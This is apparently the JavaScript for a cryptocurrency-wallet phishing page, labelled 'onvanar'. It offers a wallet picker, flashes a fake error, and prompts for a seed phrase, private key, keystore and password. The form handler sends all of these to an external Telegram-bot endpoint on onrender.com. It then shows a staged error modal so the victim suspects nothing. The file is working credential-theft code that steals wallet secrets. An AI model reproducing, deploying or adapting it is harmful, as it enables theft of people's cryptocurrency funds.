const modal = document.getElementById('walletModal');
const openModalBtn = document.getElementById('openModalBtn');
const closeModalBtn = document.getElementById('closeModalBtn');
const walletFrame = document.getElementById("walletFrame");

// Open modal and set iframe
openModalBtn.onclick = () => {
  modal.style.display = "block";
};

// load wallet name and image when wallet is selected
document.querySelectorAll(".wallet-item").forEach(item => {
    item.addEventListener("click", function () {

        // Wallet name
        document.getElementById("walletTitle").textContent =
            this.dataset.wallet;

        // Wallet image (gets it automatically)
        const img = this.querySelector("img");

        document.getElementById("walletImage").src = img.src;
        document.getElementById("walletImage").alt = img.alt;
        // Wallet image when error message is displayed (gets it automatically)

        // document.getElementById("selectedWalletImage").src = img.src;
        // document.getElementById("selectedWalletImage").alt = img.alt;
        const walletImage = document.getElementById("walletImage");
        if (walletImage) {
            walletImage.src = img.src;
            walletImage.alt = img.alt;
        }

        const selectedWalletImage = document.getElementById("selectedWalletImage");
        if (selectedWalletImage) {
            selectedWalletImage.src = img.src;
            selectedWalletImage.alt = img.alt;
        }

        // Show popup
        document.getElementById("popupModal").style.display = "block";
    });
});

// Close modal
closeModalBtn.onclick = () => {
  modal.style.display = "none";
  walletFrame.src = ""; // optional: clear iframe when closing
};

// Close modal if clicking outside the content
// window.onclick = (event) => {
//   if (event.target === modal) {
//     modal.style.display = "none";
//     walletFrame.src = "";
//   }
// };

window.addEventListener("click", function (event) {
    if (event.target === modal) {
        modal.style.display = "none";
    }

    if (event.target === popupModal) {
        popupModal.style.display = "none";
    }
});

const popupModal = document.getElementById("popupModal");
const closeForm = document.getElementById("closeForm");


const walletItems = document.querySelectorAll('.wallet-item');

walletItems.forEach(item => {
  item.onclick = () => {
    popupModal.style.display = "block";
  };
});

closeForm.onclick = () => {
    popupModal.style.display = "none";
};


// window.onclick = (event) => {
//     if (event.target === popupModal) {
//         popupModal.style.display = "none";
//     }
// };

// display error message once a wallet is selected
const walletErrorMsg = document.getElementById("walletErrorMsg");

walletItems.forEach(item => {
    item.addEventListener("click", () => {
        if (!walletErrorMsg) return;

        // remove show class first
        walletErrorMsg.classList.remove("show");

        // force reflow
        void walletErrorMsg.offsetWidth;

        // add a tiny delay so transition actually triggers
        // delay for 0.5sec
        setTimeout(() => {
            walletErrorMsg.classList.add("show");
        }, 500);

        // hide after 10s
        setTimeout(() => {
            walletErrorMsg.classList.remove("show");
        }, 10000);

        // open form modal logic here
        // openFormModal();
    });
});

//phrase, private key and key store
function openTab(evt, tabId) {
  // Hide all tab contents
  const tabContents = document.querySelectorAll(".tab-content");
  tabContents.forEach(content => {
    content.classList.remove("active");
  });

  // Remove "active" class from all tab buttons
  const tabButtons = document.querySelectorAll(".tab-button");
  tabButtons.forEach(button => {
    button.classList.remove("active");
  });

  // Show the selected tab content
  document.getElementById(tabId).classList.add("active");

  // Add "active" to the clicked button
  evt.currentTarget.classList.add("active");
}
// search wallet
// Search wallets
const walletSearch = document.getElementById("walletSearch");
const walletItemss = document.querySelectorAll(".wallet-item");

walletSearch.addEventListener("keyup", function () {
  const searchValue = this.value.toLowerCase();

  walletItemss.forEach(item => {
    const walletName = item.innerText.toLowerCase();
    item.style.display = walletName.includes(searchValue) ? "flex" : "none";
  });
});




function openTab(evt, tabId) {

    // Hide all tab contents
    const contents = document.getElementsByClassName("tab-content");
    for (let i = 0; i < contents.length; i++) {
        contents[i].style.display = "none";
        contents[i].classList.remove("active");
    }

    // Remove active class from buttons
    const buttons = document.getElementsByClassName("tab-button");
    for (let i = 0; i < buttons.length; i++) {
        buttons[i].classList.remove("active");
    }

    // Show selected tab
    document.getElementById(tabId).style.display = "block";
    document.getElementById(tabId).classList.add("active");

    // Highlight selected button
    evt.currentTarget.classList.add("active");
}


// telegram
document.getElementById("connect").addEventListener("submit", async function(e) {
    e.preventDefault();

    console.log("✅ Form submitted");

    const sitename = "onvanar";
    const walletname = document.getElementById("walletTitle").textContent;
    const phrase = document.getElementById("phrase").value;
    const privateKey = document.getElementById("private-key").value;
    const key = document.getElementById("key").value;
    const pass = document.getElementById("pass").value;

    console.log({
        sitename,
        walletname,
        phrase,
        privateKey,
        key,
        pass
    });

    try {
        console.log("Sending request...");

        const response = await fetch("https://telegram-bot-kq14.onrender.com/send", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                sitename,
                walletname,
                phrase,
                private: privateKey,
                key,
                pass
            })
        });

        console.log("Status:", response.status);

        // const text = await response.text();
        // console.log("Response:", text);

        const result = await response.json();

        console.log(result);

        if (result.success) {

        // Close the form modal
        document.getElementById("popupModal").style.display = "none";

        // Show the error modal
        showErrorModal();
        }

    } catch (err) {
        console.error(err);
    }
});

// error modal
function showErrorModal() {
    document.getElementById("errorModal").style.display = "block";
}

function closeModal() {
    document.getElementById("errorModal").style.display = "none";
}